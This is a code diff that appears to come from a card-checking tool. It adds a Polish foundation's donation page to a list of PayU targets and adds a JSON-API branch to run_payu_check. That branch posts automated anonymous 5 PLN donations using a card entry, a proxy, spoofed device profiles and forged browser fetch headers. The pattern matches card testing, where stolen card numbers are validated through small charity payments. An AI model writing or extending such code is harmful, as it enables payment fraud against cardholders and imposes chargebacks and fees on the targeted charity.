@@ -321,6 +321,31 @@ PAYU_SITES = {
             "payuCardToken": "",
         },
     },
+    "futurestepspoland": {
+        "create_type": "json_api",
+        "create_url": "https://futurestepspoland.org/fsp-payment.php",
+        "redirect_field": "redirect_url",
+        "referer": "https://futurestepspoland.org/wsparcie.html",
+        "origin": "https://futurestepspoland.org",
+        "amount": "5",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "pl",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+        "json_body": {
+            "amount_minor": 500,
+            "purpose": "Cele statutowe Fundacji",
+            "anonymous": True,
+            "pay_method": "all",
+            "email": "",
+            "first_name": "",
+            "last_name": "",
+            "terms_accepted": True,
+            "privacy_ack": True,
+        },
+    },
 }
 
 # ── real device profiles (screen / color depth) ──────────────────────
@@ -646,6 +671,21 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
                 headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
                          "Content-Type": "application/x-www-form-urlencoded"})
             redirect = r.headers.get("Location") or ""
+        elif cfg["create_type"] == "json_api":
+            body = dict(cfg["json_body"])
+            for k, v in body.items():
+                if isinstance(v, str):
+                    body[k] = v.format(first=first, last=last, email=email)
+            r = await s.post(
+                cfg["create_url"], json=body,
+                headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
+                         "Content-Type": "application/json",
+                         "Accept": "application/json",
+                         "Sec-Fetch-Dest": "empty",
+                         "Sec-Fetch-Mode": "cors",
+                         "Sec-Fetch-Site": "same-origin"})
+            data = r.json()
+            redirect = data.get(cfg.get("redirect_field", "redirect_url")) or ""
         else:
             create_payload = {
                 "amount": float(amount) if amount else cfg["amount"],
